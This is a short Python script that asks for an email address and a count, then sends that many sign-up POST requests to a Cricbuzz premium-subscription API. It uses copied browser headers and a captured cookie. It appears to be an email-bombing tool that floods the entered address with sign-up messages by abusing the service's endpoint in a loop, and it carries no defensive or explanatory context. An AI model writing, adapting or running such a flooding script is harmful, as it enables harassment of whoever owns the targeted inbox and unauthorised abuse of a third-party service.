import requests
import json

url = "https://m.cricbuzz.com/api/cbplus/auth/user/sign-up"

payload = json.dumps({
  "username": input("Enter the Email: ")
})
amount = int(input("Enter the amount : "))

headers = {
  'Reqable-Id': "reqable-id-3ff5de3c-7a93-471c-8d3e-bff12c5f7431",
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua-mobile': "?1",
  'origin': "https://m.cricbuzz.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://m.cricbuzz.com/premium-subscription/user/sign-up",
  'accept-language': "en-US,en;q=0.9,bn;q=0.8",
  'priority': "u=1, i",
  'Cookie': "cbzads=BD|not_set|not_set|DHAKA; _ga=GA1.1.187876574.1717929040; pageVisit=5; _ga_83LXEV4P47=GS1.1.1717929039.1.1.1717929179.24.0.0"
}
for i in range(amount):
	response = requests.post(url, data=payload, headers=headers)

print(response.text)
